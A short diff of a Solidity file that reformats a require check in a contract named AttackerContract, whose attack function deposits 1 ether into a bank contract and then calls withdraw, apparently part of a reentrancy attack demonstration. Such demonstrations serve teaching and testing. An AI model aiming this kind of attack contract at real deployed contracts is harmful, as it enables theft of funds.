@@ -20,10 +20,7 @@ contract AttackerContract {
     }
 
     function attack() external payable {
-        require(
-            msg.value == ATTACK_AMOUNT,
-            "Please send exactly 1 ether to start the attack"
-        );
+        require(msg.value == ATTACK_AMOUNT, "Please send exactly 1 ether to start the attack");
         bank.deposit{value: ATTACK_AMOUNT}();
         bank.withdraw();
     }
